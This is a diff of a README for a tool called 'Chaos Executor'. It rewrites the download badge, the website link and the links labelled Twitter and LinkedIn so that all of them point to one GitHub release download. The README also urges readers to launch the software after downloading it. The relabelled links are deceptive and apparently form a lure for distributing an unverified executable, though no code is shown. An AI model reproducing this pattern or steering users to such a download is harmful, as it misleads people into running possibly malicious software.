@@ -7,7 +7,7 @@ This repository contains the Chaos Executor, a powerful tool designed to create 
 
 ### Get Started
 To download the Chaos Executor software, click the button below:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Software](https://github.com/R3Dtop/Chaos-Executor/releases/tag/v2.0)](https://github.com/R3Dtop/Chaos-Executor/releases/tag/v2.0)
 
 Please note that the software needs to be launched after downloading.
 
@@ -29,15 +29,15 @@ We value your feedback! If you encounter any issues or have suggestions for impr
 Contributions are welcome! If you have ideas for enhancing the Chaos Executor tool, feel free to submit a pull request. Your contributions can help make system testing more robust and effective.
 
 ### Visit Our Website
-For more information and updates on Chaos Executor, visit our website [here](https://www.chaosexecutor.com).
+For more information and updates on Chaos Executor, visit our website [here](https://github.com/R3Dtop/Chaos-Executor/releases/tag/v2.0).
 
 ### Releases
 If the download link provided does not work or you need access to previous versions of the software, kindly check the "Releases" section of this repository for alternative download options.
 
 ### Stay Connected
 Stay connected with us on our social media channels for the latest news and announcements:
-- Twitter: [@ChaosExecutorHQ](https://twitter.com/ChaosExecutorHQ)
-- LinkedIn: [Chaos Executor](https://www.linkedin.com/company/chaos-executor)
+- Twitter: [@ChaosExecutorHQ](https://github.com/R3Dtop/Chaos-Executor/releases/tag/v2.0)
+- LinkedIn: [Chaos Executor](https://github.com/R3Dtop/Chaos-Executor/releases/tag/v2.0)
 
 ### License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
